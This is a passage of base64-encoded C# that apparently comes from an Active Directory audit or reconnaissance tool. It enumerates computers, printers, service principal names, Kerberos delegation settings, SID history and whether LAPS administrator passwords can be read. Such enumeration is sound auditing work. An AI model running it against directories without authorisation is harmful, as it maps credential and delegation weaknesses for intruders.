gid2hlbkNoYW5nZWQiLCBBZFByaW50ZXIuTWVtYmVyc1sid2hlbkNoYW5nZWQiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IFByaW50ZXJPYmogfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgQ29tcHV0ZXJSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEFkQ29tcHV0ZXIgPSAoUFNPYmplY3QpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBpbnQ/IERheXNTaW5jZUxhc3RMb2dvbiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgaW50PyBEYXlzU2luY2VMYXN0UGFzc3dvcmRDaGFuZ2UgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2wgRG9ybWFudCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIGJvb2wgUGFzc3dvcmROb3RDaGFuZ2VkYWZ0ZXJNYXhBZ2UgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgU0lESGlzdG9yeSA9ICIiOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBEZWxlZ2F0aW9uVHlwZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25Qcm90b2NvbCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25TZXJ2aWNlcyA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgRGF0ZVRpbWU/IExhc3RMb2dvbkRhdGUgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIERhdGVUaW1lPyBQYXNzd29yZExhc3RTZXQgPSBudWxsOwoKICAgICAgICAgICAgICAgICAgICBpZiAoQWRDb21wdXRlci5NZW1iZXJzWyJMYXN0TG9nb25EYXRlIl0uVmFsdWUgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vTGFzdExvZ29uRGF0ZSA9IERhdGVUaW1lLkZyb21GaWxlVGltZSgobG9uZykoQWRDb21wdXRlci5NZW1iZXJzWyJsYXN0TG9nb25UaW1lU3RhbXAiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAvLyBMYXN0TG9nb25EYXRlIGlzIGxhc3RMb2dvblRpbWVTdGFtcCBjb252ZXJ0ZWQgdG8gbG9jYWwgdGltZQogICAgICAgICAgICAgICAgICAgICAgICBMYXN0TG9nb25EYXRlID0gQ29udmVydC5Ub0RhdGVUaW1lKEFkQ29tcHV0ZXIuTWVtYmVyc1siTGFzdExvZ29uRGF0ZSJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgRGF5c1NpbmNlTGFzdExvZ29uID0gTWF0aC5BYnMoKERhdGUxIC0gKERhdGVUaW1lKUxhc3RMb2dvbkRhdGUpLkRheXMpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoRGF5c1NpbmNlTGFzdExvZ29uID4gRG9ybWFudFRpbWVTcGFuKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEb3JtYW50ID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQWRDb21wdXRlci5NZW1iZXJzWyJQYXNzd29yZExhc3RTZXQiXS5WYWx1ZSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy9QYXNzd29yZExhc3RTZXQgPSBEYXRlVGltZS5Gcm9tRmlsZVRpbWUoKGxvbmcpKEFkQ29tcHV0ZXIuTWVtYmVyc1sicHdkTGFzdFNldCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFBhc3N3b3JkTGFzdFNldCBpcyBwd2RMYXN0U2V0IGNvbnZlcnRlZCB0byBsb2NhbCB0aW1lCiAgICAgICAgICAgICAgICAgICAgICAgIFBhc3N3b3JkTGFzdFNldCA9IENvbnZlcnQuVG9EYXRlVGltZShBZENvbXB1dGVyLk1lbWJlcnNbIlBhc3N3b3JkTGFzdFNldCJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlID0gTWF0aC5BYnMoKERhdGUxIC0gKERhdGVUaW1lKVBhc3N3b3JkTGFzdFNldCkuRGF5cyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChEYXlzU2luY2VMYXN0UGFzc3dvcmRDaGFuZ2UgPiBQYXNzTWF4QWdlKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXNzd29yZE5vdENoYW5nZWRhZnRlck1heEFnZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCAoKGJvb2wpIEFkQ29tcHV0ZXIuTWVtYmVyc1siVHJ1c3RlZEZvckRlbGVnYXRpb24iXS5WYWx1ZSkgJiYgKChpbnQpIEFkQ29tcHV0ZXIuTWVtYmVyc1sicHJpbWFyeUdyb3VwSUQiXS5WYWx1ZSA9PSA1MTUpICkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25UeXBlID0gIlVuY29uc3RyYWluZWQiOwogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uU2VydmljZXMgPSAiQW55IjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkQ29tcHV0ZXIuTWVtYmVyc1sibXNEUy1BbGxvd2VkVG9EZWxlZ2F0ZVRvIl0gIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIE1pY3Jvc29mdC5BY3RpdmVEaXJlY3RvcnkuTWFuYWdlbWVudC5BRFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uIGRlbGVnYXRldG8gPSAoTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24pIEFkQ29tcHV0ZXIuTWVtYmVyc1sibXNEUy1BbGxvd2VkVG9EZWxlZ2F0ZVRvIl0uVmFsdWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkZWxlZ2F0ZXRvLlZhbHVlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25UeXBlID0gIkNvbnN0cmFpbmVkIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkZWxlZ2F0ZXRvLlZhbHVlIGlzIFN5c3RlbS5TdHJpbmdbXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICh2YXIgdmFsdWUgaW4gKFN0cmluZ1tdKSBkZWxlZ2F0ZXRvLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblNlcnZpY2VzID0gRGVsZWdhdGlvblNlcnZpY2VzICsgIiwiICsgQ29udmVydC5Ub1N0cmluZyh2YWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25TZXJ2aWNlcyA9IERlbGVnYXRpb25TZXJ2aWNlcy5UcmltU3RhcnQoJywnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uU2VydmljZXMgPSBDb252ZXJ0LlRvU3RyaW5nKGRlbGVnYXRldG8uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgoYm9vbCkgQWRDb21wdXRlci5NZW1iZXJzWyJUcnVzdGVkVG9BdXRoRm9yRGVsZWdhdGlvbiJdLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblByb3RvY29sID0gIkFueSI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKERlbGVnYXRpb25UeXBlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uUHJvdG9jb2wgPSAiS2VyYmVyb3MiOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbiBoaXN0b3J5ID0gKE1pY3Jvc29mdC5BY3RpdmVEaXJlY3RvcnkuTWFuYWdlbWVudC5BRFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uKSBBZENvbXB1dGVyLk1lbWJlcnNbIlNJREhpc3RvcnkiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICBpZiAoaGlzdG9yeS5WYWx1ZSBpcyBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcltdKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIHNpZHMgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAodmFyIHZhbHVlIGluIChTZWN1cml0eUlkZW50aWZpZXJbXSkgaGlzdG9yeS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2lkcyA9IHNpZHMgKyAiLCIgKyBDb252ZXJ0LlRvU3RyaW5nKHZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBTSURIaXN0b3J5ID0gc2lkcy5UcmltU3RhcnQoJywnKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgU0lESGlzdG9yeSA9IGhpc3RvcnkgIT0gbnVsbCA/IENvbnZlcnQuVG9TdHJpbmcoaGlzdG9yeS5WYWx1ZSkgOiAiIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE9wZXJhdGluZ1N5c3RlbSA9IENsZWFuU3RyaW5nKChBZENvbXB1dGVyLk1lbWJlcnNbIk9wZXJhdGluZ1N5c3RlbSJdLlZhbHVlICE9IG51bGwgPyBBZENvbXB1dGVyLk1lbWJlcnNbIk9wZXJhdGluZ1N5c3RlbSJdLlZhbHVlIDogIi0iKSArICIgIiArIEFkQ29tcHV0ZXIuTWVtYmVyc1siT3BlcmF0aW5nU3lzdGVtSG90Zml4Il0uVmFsdWUgKyAiICIgKyBBZENvbXB1dGVyLk1lbWJlcnNbIk9wZXJhdGluZ1N5c3RlbVNlcnZpY2VQYWNrIl0uVmFsdWUgKyAiICIgKyBBZENvbXB1dGVyLk1lbWJlcnNbIk9wZXJhdGluZ1N5c3RlbVZlcnNpb24iXS5WYWx1ZSk7CgogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IENvbXB1dGVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRDb21wdXRlci5NZW1iZXJzWyJOYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkROU0hvc3ROYW1lIiwgQWRDb21wdXRlci5NZW1iZXJzWyJETlNIb3N0TmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJFbmFibGVkIiwgQWRDb21wdXRlci5NZW1iZXJzWyJFbmFibGVkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIklQdjRBZGRyZXNzIiwgQWRDb21wdXRlci5NZW1iZXJzWyJJUHY0QWRkcmVzcyJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJPcGVyYXRpbmcgU3lzdGVtIiwgT3BlcmF0aW5nU3lzdGVtKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMb2dvbiBBZ2UgKGRheXMpIiwgRGF5c1NpbmNlTGFzdExvZ29uKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBBZ2UgKGRheXMpIiwgRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEb3JtYW50ICg+ICIgKyBEb3JtYW50VGltZVNwYW4gKyAiIGRheXMpIiwgRG9ybWFudCkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgQWdlICg+ICIgKyBQYXNzTWF4QWdlICsgIiBkYXlzKSIsIFBhc3N3b3JkTm90Q2hhbmdlZGFmdGVyTWF4QWdlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZWxlZ2F0aW9uIFR5cGUiLCBEZWxlZ2F0aW9uVHlwZSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVsZWdhdGlvbiBQcm90b2NvbCIsIERlbGVnYXRpb25Qcm90b2NvbCkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVsZWdhdGlvbiBTZXJ2aWNlcyIsIERlbGVnYXRpb25TZXJ2aWNlcykpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlck5hbWUiLCBBZENvbXB1dGVyLk1lbWJlcnNbIlNhbUFjY291bnROYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlByaW1hcnkgR3JvdXAgSUQiLCBBZENvbXB1dGVyLk1lbWJlcnNbInByaW1hcnlHcm91cElEIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNJRCIsIEFkQ29tcHV0ZXIuTWVtYmVyc1siU0lEIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNJREhpc3RvcnkiLCBTSURIaXN0b3J5KSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZXNjcmlwdGlvbiIsIEFkQ29tcHV0ZXIuTWVtYmVyc1siRGVzY3JpcHRpb24iXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgibXMtZHMtQ3JlYXRvclNpZCIsIEFkQ29tcHV0ZXIuTWVtYmVyc1sibXMtZHMtQ3JlYXRvclNpZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMYXN0IExvZ29uIERhdGUiLCBMYXN0TG9nb25EYXRlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBMYXN0U2V0IiwgUGFzc3dvcmRMYXN0U2V0KSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJVc2VyQWNjb3VudENvbnRyb2wiLCBBZENvbXB1dGVyLk1lbWJlcnNbIlVzZXJBY2NvdW50Q29udHJvbCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJ3aGVuQ3JlYXRlZCIsIEFkQ29tcHV0ZXIuTWVtYmVyc1sid2hlbkNyZWF0ZWQiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNoYW5nZWQiLCBBZENvbXB1dGVyLk1lbWJlcnNbIndoZW5DaGFuZ2VkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRpc3Rpbmd1aXNoZWQgTmFtZSIsIEFkQ29tcHV0ZXIuTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IENvbXB1dGVyT2JqIH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIENvbXB1dGVyU1BOUmVjb3JkUHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBBZENvbXB1dGVyID0gKFBTT2JqZWN0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgTGlzdDxQU09iamVjdD4gU1BOTGlzdCA9IG5ldyBMaXN0PFBTT2JqZWN0PigpOwoKICAgICAgICAgICAgICAgICAgICBNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbiBTUE5zID0gKE1pY3Jvc29mdC5BY3RpdmVEaXJlY3RvcnkuTWFuYWdlbWVudC5BRFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uKUFkQ29tcHV0ZXIuTWVtYmVyc1sic2VydmljZVByaW5jaXBhbE5hbWUiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICBpZiAoU1BOcy5WYWx1ZSBpcyBTeXN0ZW0uU3RyaW5nW10pCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChTdHJpbmcgU1BOIGluIChTeXN0ZW0uU3RyaW5nW10pU1BOcy5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYm9vbCBmbGFnID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN0cmluZ1tdIFNQTkFycmF5ID0gU1BOLlNwbGl0KCcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChQU09iamVjdCBPYmogaW4gU1BOTGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIChTdHJpbmcpIE9iai5NZW1iZXJzWyJTZXJ2aWNlIl0uVmFsdWUgPT0gU1BOQXJyYXlbMF0gKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqLk1lbWJlcnNbIkhvc3QiXS5WYWx1ZSA9IFN0cmluZy5Kb2luKCIsIiwgKE9iai5NZW1iZXJzWyJIb3N0Il0uVmFsdWUgKyAiLCIgKyBTUE5BcnJheVsxXSkuU3BsaXQoJywnKS5EaXN0aW5jdCgpLlRvQXJyYXkoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmxhZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBDb21wdXRlclNQTk9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbXB1dGVyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIEFkQ29tcHV0ZXIuTWVtYmVyc1siTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTZXJ2aWNlIiwgU1BOQXJyYXlbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkhvc3QiLCBTUE5BcnJheVsxXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNQTkxpc3QuQWRkKCBDb21wdXRlclNQTk9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFN0cmluZ1tdIFNQTkFycmF5ID0gQ29udmVydC5Ub1N0cmluZyhTUE5zLlZhbHVlKS5TcGxpdCgnLycpOwogICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBDb21wdXRlclNQTk9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCBBZENvbXB1dGVyLk1lbWJlcnNbIk5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNlcnZpY2UiLCBTUE5BcnJheVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkhvc3QiLCBTUE5BcnJheVsxXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTUE5MaXN0LkFkZCggQ29tcHV0ZXJTUE5PYmogKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFNQTkxpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBMQVBTUmVjb3JkUHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBBZENvbXB1dGVyID0gKFBTT2JqZWN0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgYm9vbCBQYXNzd29yZFN0b3JlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIERhdGVUaW1lPyBDdXJyZW50RXhwaXJhdGlvbiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBDdXJyZW50RXhwaXJhdGlvbiA9IERhdGVUaW1lLkZyb21GaWxlVGltZSgobG9uZykoQWRDb21wdXRlci5NZW1iZXJzWyJtcy1NY3MtQWRtUHdkRXhwaXJhdGlvblRpbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXNzd29yZFN0b3JlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIC8vKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy9Db25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IExBUFNPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICBMQVBTT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSG9zdG5hbWUiLCAoQWRDb21wdXRlci5NZW1iZXJzWyJETlNIb3N0TmFtZSJdLlZhbHVlICE9IG51bGwgPyBBZENvbXB1dGVyLk1lbWJlcnNbIkROU0hvc3ROYW1lIl0uVmFsdWUgOiBBZENvbXB1dGVyLk1lbWJlcnNbIkNOIl0uVmFsdWUgKSkpOwogICAgICAgICAgICAgICAgICAgIExBUFNPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTdG9yZWQiLCBQYXNzd29yZFN0b3JlZCkpOwogICAgICAgICAgICAgICAgICAgIExBUFNPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJSZWFkYWJsZSIsIChBZENvbXB1dGVyLk1lbWJlcnNbIm1zLU1jcy1BZG1Qd2QiXS5WYWx1ZSAhPSBudWxsID8gdHJ1ZSA6IGZhbHNlKSkpOwogICAgICAgICAgICAgICAgICAgIExBUFNPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQ